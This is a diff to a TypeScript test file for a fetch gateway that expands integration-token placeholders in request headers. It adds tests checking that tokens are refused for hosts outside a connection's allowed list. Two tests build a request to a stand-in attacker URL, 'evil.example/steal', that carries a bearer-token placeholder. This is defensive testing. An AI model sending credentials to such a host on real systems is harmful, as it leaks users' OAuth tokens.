@@ -14,8 +14,9 @@ import * as secretService from '#mcp/secrets/service.ts'
 import * as communityRepo from '#worker/community/repo.ts'
 import { createInMemoryUserMeterEnv } from '#worker/test-support/user-meter.ts'
 import * as packageRepo from '#worker/package-registry/repo.ts'
-import * as ownedSecretNames from '#worker/integrations/owned-secret-names.ts'
+import * as integrationCredentials from '#worker/integrations/credentials.ts'
 import * as integrationPackageAccess from '#worker/integrations/package-access.ts'
+import * as integrationService from '#worker/integrations/service.ts'
 
 const userMeter = createInMemoryUserMeterEnv()
 const env = {
@@ -388,7 +389,7 @@ test('fetch gateway gates integration-owned token names by the connection grant,
 	const request = () =>
 		new Request('https://example.com/api', {
 			headers: {
-				Authorization: 'Bearer {{secret:googleAccessToken|scope=user}}',
+				Authorization: 'Bearer {{integration-token:google}}',
 			},
 		})
 	const packageProps = {
@@ -440,12 +441,23 @@ test('fetch gateway gates integration-owned token names by the connection grant,
 			allowedHosts: ['example.com'],
 			allowedPackages: [],
 		})
-	const ownerSpy = vi
-		.spyOn(ownedSecretNames, 'findIntegrationOwningSecretName')
-		.mockResolvedValue({ name: 'google' })
+	const tokenSpy = vi
+		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
+		.mockResolvedValue('oauth-access')
 	const grantSpy = vi
 		.spyOn(integrationPackageAccess, 'assertCanUseIntegration')
 		.mockResolvedValue(undefined)
+	const joinedSpy = vi
+		.spyOn(integrationService, 'getJoinedIntegration')
+		.mockResolvedValue({
+			lane: 'user',
+			app: {
+				apiBaseUrl: 'https://example.com',
+			},
+			connection: {
+				requiredHosts: ['example.com'],
+			},
+		} as never)
 
 	try {
 		const transformed = await expandSecretPlaceholders({
@@ -460,14 +472,104 @@ test('fetch gateway gates integration-owned token names by the connection grant,
 				packageId: 'pkg-1',
 			}),
 		)
+		expect(tokenSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				userId: 'user-123',
+				name: 'google',
+			}),
+		)
+		expect(resolveSpy).not.toHaveBeenCalled()
 		expect(packageSpy).not.toHaveBeenCalled()
 		expect(forkSpy).not.toHaveBeenCalled()
 	} finally {
 		packageSpy.mockRestore()
 		forkSpy.mockRestore()
 		resolveSpy.mockRestore()
-		ownerSpy.mockRestore()
+		tokenSpy.mockRestore()
 		grantSpy.mockRestore()
+		joinedSpy.mockRestore()
+	}
+})
+
+test('fetch gateway refuses integration tokens for a host outside requiredHosts', async () => {
+	const grantSpy = vi
+		.spyOn(integrationPackageAccess, 'assertCanUseIntegration')
+		.mockResolvedValue(undefined)
+	const tokenSpy = vi
+		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
+		.mockResolvedValue('oauth-access')
+	const joinedSpy = vi
+		.spyOn(integrationService, 'getJoinedIntegration')
+		.mockResolvedValue({
+			lane: 'user',
+			app: {
+				apiBaseUrl: 'https://www.googleapis.com',
+			},
+			connection: {
+				requiredHosts: ['www.googleapis.com', 'oauth2.googleapis.com'],
+			},
+		} as never)
+
+	try {
+		await expect(
+			expandSecretPlaceholders({
+				request: new Request('https://evil.example/steal', {
+					headers: {
+						Authorization: 'Bearer {{integration-token:google}}',
+					},
+				}),
+				props,
+				env,
+			}),
+		).rejects.toThrow('does not allow requests to host "evil.example"')
+		expect(tokenSpy).toHaveBeenCalled()
+		expect(joinedSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				userId: 'user-123',
+				name: 'google',
+			}),
+		)
+	} finally {
+		grantSpy.mockRestore()
+		tokenSpy.mockRestore()
+		joinedSpy.mockRestore()
+	}
+})
+
+test('fetch gateway refuses a resolved integration token when the joined connection is missing', async () => {
+	const grantSpy = vi
+		.spyOn(integrationPackageAccess, 'assertCanUseIntegration')
+		.mockResolvedValue(undefined)
+	const tokenSpy = vi
+		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
+		.mockResolvedValue('oauth-access')
+	const joinedSpy = vi
+		.spyOn(integrationService, 'getJoinedIntegration')
+		.mockResolvedValue(null)
+
+	try {
+		await expect(
+			expandSecretPlaceholders({
+				request: new Request('https://evil.example/steal', {
+					headers: {
+						Authorization: 'Bearer {{integration-token:google}}',
+					},
+				}),
+				props,
+				env,
+			}),
+		).rejects.toThrow('does not have a stored access token')
+		expect(tokenSpy).toHaveBeenCalled()
+		expect(joinedSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				userId: 'user-123',
+				name: 'google',
+			}),
+		)
+	} finally {
+		grantSpy.mockRestore()
+		tokenSpy.mockRestore()
+		joinedSpy.mockRestore()
 	}
 })
 
